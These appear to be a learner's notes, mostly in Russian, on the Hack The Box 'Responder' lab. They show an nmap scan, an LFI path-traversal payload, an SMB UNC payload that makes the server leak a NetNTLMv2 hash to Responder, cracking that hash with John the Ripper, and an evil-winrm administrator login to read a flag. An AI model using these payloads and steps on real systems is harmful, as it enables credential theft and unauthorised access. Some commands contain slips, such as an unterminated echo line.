*** RESPONDER 


### INDTRODUTION 
	
	- Большинство организаций используют Active Directory для настройки своих 
	доменных сетей Windows. 

	- Microsoft использует NTLM (New Technology LAN Manager) и Kerberos для 
	служб аутентификации. Несмотря на известные уязвимости, NTLM по-прежнему 
	широко используется даже в новых системах для обеспечения совместимости с 
	устаревшими клиентами и серверам

	
	--- В этом лабораторном занятии основное внимание уделяется тому, как 
	уязвимость включения файлов на веб-странице, обслуживаемой на компьютере с
	Windows, может быть использована для сбора запроса NetNTLMv2 пользователя, 
	работающего на веб-сервере

	---  Мы будем использовать утилиту под названием RESPONDER для захвата хэша 
	NetNTLMv2, а затем использовать утилиту, известную как JOHN THE RIPPER

### BEGIN 
	
	- NMAP
		
		-v : увеличить уровень детализации 
		-p- : этот флаг сканирует все TCP-порты в диапазоне от 0 до 65535
		-sV : попытки определить версию службы, работающей на порту 
		-sC : сканирование с использованием сценарием NSE по умолчанию
		--min-rate : используется джля указания минимального количества пакетов
		которые Nmap должен отправлять в секунду; это ускоряет сканирование по
		мере увеличения числа 

		@ nmap -v -p- --min-rate 5000 -sV -sC {target_ip}
			
			80/tcp		open	http	Apache httpd 2.4.52 
			5985/tcp	open	http	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
			7680/tcp	open	pando-pub?

		
### Удаленное управление Windows or WinRM 
			
	- WinRM на порту 5985/tcp - это встроенный в Windows протокол удаленного
	управления

	- Windows Remote Management позволяет пользователю:
			
		-> Удаленно общаться и взаимодействовать с хостами

		-> Выполняйте команды удаленно в системах, которые вашими локальными
		но доступны по сети
			
		-> Отслеживайте, управляйте и настраиваете серверы, операционные
		системы и клиентские машины удаленно

	--- Для пентестера это означает, что если мы сможем найти учетные 
	данные (обычно имя пользователя и пароль) для пользователя с правами 
	удаленного управления, мы потенциально можем получить оболочку 
	PowerShell на хосте

### Website Enumeration - Перечисление веб-сайтов 

	- При открытии http://{target_ip} используя Firefox, браузер возвращает 
	сообщение о невозможности открыть сайт.
	
	- Глядя в сторону URL-адреса, теперь он показывает
		
		http://unika.htb
	
		Сайт перенаправил браузеру новый URL-адрес, и ваш хост не знает как
		найти виртуальный unika.htb. Этот ВЕБ-сервер использует хостинг 
		на основе имени для обслуживания запросов 

	--- Виртуальный хостинг на основе имен - это метод размещения нескольких
	доменных имен на одном сервере. Это позволяет одному серверу совместно
	использовать свои ресурсы, такие как память и циклы процессора, не требуя,
	чтобы все службы использовались одним и тем же именем хоста

	
	# ВЕБ-СЕРВЕР проверяет доменное имя, указанное в Host поле заголовка
	HTTP-запроса и отправляет ответ в соответствии с этим 

		- /etc/hosts файл используется для преобразования имени хоста в IP-адрес
		поэтому нам нужно будет добавлять запись в /etc/hosts файл для этого
		домена, чтобы позволить браузеру преобразовать адрес для unika.htb

	
	# Entry in the /etc/hosts 
		
		echo "{target_ip} unika.htb" | sudo tee -a /etc/hosts
		
		- Добавление этой записи в /etc/hosts файл позволит браузеру разрешить
		имя хоста unika.htb к соответствующему IP-адресу, таким образом
		включать заголовок HTTP haeder Host: unika.htb  


	# LET go to {target_ip} in FIREFOX 
		
		SUCCESSFULL REDIRECT to unika.htb 
		
		http://unika.htb/#
		
### FILE INCLUSION (LFI) ВКЛЮЧЕНИЕ ФАЙЛОВ 

	- Просматривая сайт, мы не видим ничего особенно интересного. Хотя можно
	заметить: 
		
		# параметр выбора языка на панели навигации

	- Изменение параметра в данном случае приводит к такому URL-адресу

		# http://unika.htb/index.php?page=french.html

		Французская версия сайта 

	- Заметив URL, мы видим, что FRENCH.html страница загружается через PAGE 
	параметр, который потенциально могут быть уязвимы для уязвимости
		
		LFI Local File Include локального включения файлов 

	- Уязвимость включения файлов. Динамические веб-сайты включают
	HTML-страницы на лету, используя нформацию из HTTP-запроса, включая 
	параметры GET и POST, файлы cookie и другие переменные. Обычно страница 
	«включает» другую страницу на основе некоторых из этих параметров


	--- LFI или включение локального файла происходит, когда злоумышленник может 
	заставить веб-сайт включить файл, который не предназначен для этого 
	приложения. Типичный пример — когда приложение использует путь к файлу в 
	качестве входных данных. Если приложение рассматривает этот ввод как 
	доверенный, и необходимые санитарные проверки не выполняются для этого ввода,
	злоумышленник может использовать его, используя 
		
		../ # строку в названии введенного файла и в конечном итоге
		просматривать конфиденциальные файлы в локальной файловой системе. В
		некоторых ограниченных случаях LFI также может привести к выполнению
		кода 

	--- RFI или удаленное включение файлов аналогичны LFI, но в этом случае
	злоумышленник может загрузить удаленный файл на хост, используя такие 
	протколы, как HTTP, FTP и т.д.
	
	
### TESTING PAGE parametr

		
	- Мы тестируем PAGE параметр, чтобы увидеть, можем ли мы включать файлы 
	в целевой системе в ответ сервера

	- Будем тестироваться с некоторыми общеизвестными файлами, которые будут
	иметь одно и то же имя в сетях, доменах Windows и системах, которые можно
	найти здесь: 

		https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

	- Одним из наиболее распространенных файлов, к которым пентестер может 
	попытаться получить доступ на компьютере с Windows для проверки LFI, 
	является файл hosts: 
		
		1) WINDOWS\System32\drivers\etc\hosts 
		# Этот файл помогает в локальном преобразовании имен хостов в IP-адреса
		
		2) ../
		# Строка используется для перехода назад по каталогу по одному. Таким
		образом включая в URL-адрес ../ несколько раз подряд позволит вернуться
		к базовому каталогу 
			
			# С:\

	- http://unika.htb/index.php?
	page=../../../../../../../../windows/system32/drivers/etc/hosts
		
		- Видим файл: 

		 # Copyright (c) 1993-2009 Microsoft Corp. # # Это пример файла HOSTS, 
		используемого Microsoft TCP/IP для Windows. # # Этот файл содержит 
		сопоставления IP-адресов с именами хостов. Каждый # запись должна быть 
		сохранена на отдельной строке. IP-адрес должен # помещается в первый 
		столбец, за которым следует соответствующее имя хоста. # IP-адрес и имя 
		хоста должны быть разделены хотя бы одним # Космос. # # Кроме того, 
		комментарии (такие как эти) могут быть вставлены в отдельные # строк или 
		после имени машины, обозначенного символом '#'. # # Например: # # 
		102.54.94.97 rhino.acme.com # исходный сервер # 38.25.63.10 x.acme.com # 
		x клиентский хост # Разрешение имени локального хоста выполняется внутри 
		самого DNS. # 127.0.0.1 локальный хост # ::1 локальный хост


	- GREAT LFI возможен, так как мы можем посмотреть 
		
		C:\windows\system32\drivers\etc\hosts файл в содержимом ответа 
		
		- Look for this file:
			
			# this_project/files/index.php.html
	
	- Включение файла стало возможным, потому что в бекенде include() метод PHP
	используется для обработки URL page параметра для обслуживания разных
	веб-страниц для разных языков. И потому что на этом PAGE параметре не
	производится должная санитарная обработка, поэтому мы смогли передать
	вредоносный ввод, и следовательно просматривать внутренние системные файлы



### WHAT is the INCLUDE() method PHP?

	- метод INCLUDE() берет весь текст/код/разметку, которые существуют в
	указанном файле, и загружает их в памяти, делая ее доступной для 
	использования 
		
		 EXAMPLE:

		 FILE 1 --> vars.php
		 <?php

		 $color = 'green';
		 $fruit = 'apple'; 

		 ?>

		 ###########################

		 FILE 2 --> test.php
		 <?php>

		 echo "A $color $fruit"; //  output = "A"

		 include 'vars.php';

		 echo "A $color $fruit"; // output = "A green apple "

		 ?> 

		MORE ABOUT PHP INCLUDE HERE:
			
			https://www.php.net/manual/en/function.include.php


### RESPONDER CHALLAENGE CAPTURE
ЗАХВАТ ВЫЗОВА РЕСПОНДЕНТА

	
	- Мы знаем, что эта веб-страница уязвима для включения файлов и 
	обслуживается на компьютере с Windows. Таким образом, существует вероятность 
	включения файла на нашу рабочую станцию злоумышленника. Если мы выберем 
	такой протокол, как SMB, Windows попытается пройти аутентификацию на нашей 
	машине, и мы сможем перехватить файл NetNTLMv2.

	---- Что такое NTLM (новая технология LAN MANAGER)

	- NTLM это набор протоколов аутентификации, созданных Microsoft. 
	Это протокол проверки подлинности типа «вызов-ответ», используемый для 
	проверки подлинности клиента на ресурсе в домене Active Directory

	- Это тип единого входа (SSO), поскольку он позволяет пользователю указать 
	базовый фактор проверки подлинности только один раз при входе в систему

		
	--- Процесс аутентификации NTLM выполняется следующим образом:
		
		1 - Клиент отправляет на сервер имя пользоваталя и доменное имя 

		2 - Сервер генерирует случайную строку символов, называемую вызовом

		3 - Клиент шифрует вызов с помощью хэша NTLM пароля пользователя и
		отправляет его обратно на сервер. 

		4 - Сервер извлекает пароль пользователя (или аналогичный)

		5 - Сервер использует хэш-значение, полученное из базы-данных учетных
		записей безопасости, для шифрования строки запроса. Затем знеачение 
		сравнивается со значением, полученным от клиента. Если значения 
		совпадают, клиент аутентифицируется    

		MORE INFO ABOUT AUTENTIFICATION NTLM here 
			
			https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/	

	
	### NTLM vs NTHash vs NetNTMLv2

		
		-- hash function это односторонняя функция, которая принимает любое количество 
		данных и возвращает значение фиксированного размера. Обычно результат 
		называется хэшем, дайджестом или отпечатком пальца. Они используются для 
		более безопасного хранения паролей, так как нет возможности напрямую 
		преобразовать хэш обратно в исходные данные (хотя существуют атаки, 
		направленные на восстановление паролей из хэшей, как мы увидим позже). 
		Таким образом, сервер может хранить хэш вашего пароля, и когда вы 
		отправляете свой пароль на сайт, он хеширует введенные вами данные и 
		сравниваетрезультат с хэшем в базе данных, и если они совпадают, он 
		знает, что вы вели правильный пароль

		-- NTHash результат работы алгоритма, используемого для хранения паролей 
		в системах Windows в базе данных SAM и на контроллерах домена. NTHash 
		часто называют хэшем NTLM или даже просто NTLM, что очень вводит в 
		заблуждение/запутывает.

		-- Когда протокол NTLM хочет выполнить аутентификацию по сети, он 
		использует модель запроса/ответа, как описано выше. Запрос/ответ 
		NetNTLMv2 представляет собой строку, специально отформатированную для 
		включения запроса и ответа. Его часто называют хэшем NetNTLMv2, но на 
		самом деле это не хэш. Тем не менее, его часто называют хешем, потому 
		что мы атакуем его таким же образом. Вы увидите, что объекты NetNTLMv2 
		называются NTLMv2 или даже NTLM

### USING RESPONDER
ИСПОЛЬЗОВАНИЕ ОТВЕТЧИКА

	
	- В файле конфигурации php.ini, строка:
		
		allow_url_include off # находится в значении OFF

		# что указывает на то PHP не загружает удаленные URL-адреса HTTP or FTP
		чтобы предотвратить атаки удаленного включения файлов.

	-- Однако даже если строки 

		allow_url_include	off  
		allow_url_fopen		off # находятся в значении off 

		# PHP не будет препятствовать загрузке URL-адресов SMB 

	-- В нашем случае мы можем злоупотребить этой функциональностью 
		
		# Теперь на примере мы можем попытаться загрузить URL-адрес SMB
			
			https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi

		# в этом процессе мы можем получить хэши от цели, используя Responder
			
			https://github.com/lgandx/Responder


	### Как работает Responder (ОТВЕТЧИК)
		
		- Responder может выполнять множество различных видов атак, но в этом 
		случае он настроит вредоносный SMB-сервер. Когда целевая машина пытается 
		выполнить аутентификацию NTLM на этом сервере, Responder отправляет 
		серверу запрос на шифрование с помощью пароля пользователя. Когда сервер 
		ответит, Responder будет использовать вызов и зашифрованный ответ для 
		создания файла NetNTLMv2. Хотя мы не можем отменить NetNTLMv2, мы можем 
		попробовать множество разных общих паролей, чтобы увидеть, генерирует ли 
		какой-либо из них один и тот же ответ на вызов, и если мы находим его, 
		мы знаем, что это пароль. Это часто называют взломом хэша, который мы 
		будем делать с помощью программы под названием 
			
			John The Ripper 

		- Скачать Responder и проверить конфигурации: 

			Download: 
				
				git clone https://github.com/lgandx/Responder 

			Check configuration Responder.conf option to SMB

				cat Responder.conf 
					; Server to start
					SQL = On 
					SMB = On 
				
					<SNIP>

		- Когда файл конфигурации готов запускаем Responder.py с флагом -I
		для указаняи интерфейса tun0
			
			@ sudo pip install netifaces 
			@ sudo python3 Responder.py -I tun0 
				
				... wait

			# Когда сервер-ответчик готов, мы указываем серверу включить 
			ресурс с нашего SMB-сервера, установив параметр page= следующим
			образом:
				
				http://unika.htb/index.php?page=//{my_ip_mashine}/{any_namefile}

			# В этом случае, поскольку у нас есть возможность указать адрес 
			общего ресурса SMB, мы указываем IP-адрес нашей атакующей машины. 
			Теперь сервер пытается загрузить ресурс с нашего SMB-сервера, и 
			Responder захватывает достаточно этого, чтобы получить файл NetNTLMv2
				
				()... Примечание обязательно добавить http:// в начале адреса
				поскольку некоторые браузеры могут выбрать простой поиск в гугл

			# После отправления нашей полезной нагрузки через веб-браузер мы
			получаем сообщение об ошибке о невозможности загрузки запрошенного
			файла

			- Но при проверке нашего прослушиваемого сервера Responder мы видим,
			что у нас есть NetNTLMv для пользователя-администратора 

			- NetNTLMv2 включает в себя как вызов (случайный текст), так и 
			зашифрованный ответ 


	# RESPONDER CATCH CALL AND HASH

			[SMB] NTLMv2-SSP Client   : ::ffff:10.129.195.237
		    [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
			[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b8a0f6d100a70c0e


### HASH CRACKING
ВЗЛОМ ХЭША

	
	- Install John

		@ sudo pacman -S john # JOHN THE RIPPER 
		@ john
			
			Created Directory: /home/mwuckert/.john 

	- Мы можем сбросить хэш в файл и попытаться взломать его с помощью JOHN,
	который представляет собой взлом хэш пароля утилиты 

		@ echo "Administrator::RESPONDER:b8a0f6d100a70c0ehash.txt

	- Мы передаем файл хэша в JOHN и взламываем пароль для учетной записи 
	администратора. Тип хэша автоматически идентифицируется JOHN инструментом
	командной строки 

		-w список слов для использования перебора хеша 

		@ sudo john -w=/home/mwuckert/Desktop/htb/app/tier1/appointment/SecLists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt files/ntlmv2-ssp-hash.txt 
			
			badminton        (Administrator) 



### WinRM 

	- Мы подключимся к службе WinRM на цели и попытаемся получить сеанс.
	Поскольку PowerShell по умолчанию не установлен в Linux, мы будем
	использовать инструмент под названием Evil-WinRM:
		
		https://github.com/Hackplayers/evil-winrm

	- Установка RUBY 
		

		@ sudo pacman -S ruby rubygems
		
		@ touch ~/.profile
			
			export GEM_HOME="$(ruby -e 'puts Gem.user_dir')"
			export PATH="$PATH:$GEM_HOME/bin" 
			
			- restart terminal 	
		
		@ gem install winrm winrm-fs stringio logger fileutils 
		
		@ git clone https://github.com/Hackplayers/evil-winrm 

	-  Using EvilWinRM

		@ ruby evil-winrm -i {target_ip} -u administrator -p badminton 
			
				C:\Users\Administrator\Documents
			@ dir  # посмотреть вложенные дирректории 
			
			@ cd .. # вернуться в предыдущюю дирректорию
				C:\Users\Administrator\
			@ cd ..
				C:\Users\
			@ dir 
				Administrator
				mike
				Public

			@ cd mike
				C:\Users\mike
			@ dir
				Desktop 
			@ cd Desktop
				C:\Users\Desktop\
			@ dir
				flag.txt 
			@ cat flag.txt
				ea81b7afddd03efaa0945333ed147fac
				
